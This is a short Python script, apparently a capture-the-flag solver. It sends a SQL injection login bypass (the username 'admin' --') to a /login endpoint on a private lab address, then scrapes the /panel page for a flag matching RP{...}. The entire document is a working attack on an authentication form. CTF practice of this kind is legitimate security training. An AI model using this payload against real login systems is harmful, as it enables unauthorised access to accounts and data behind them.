import sys, re
import requests
PORT = int(sys.argv[1])
B = "http://172.170.10.11:%d" % PORT
s = requests.Session()
r = s.post(B + "/login", data={"u": "admin' --", "p": "x"}, timeout=8)
html = s.get(B + "/panel", timeout=8).text
m = re.search(r"RP\{[^}]*\}", html)
print("FLAG:", m.group(0) if m else "(no encontrada)")
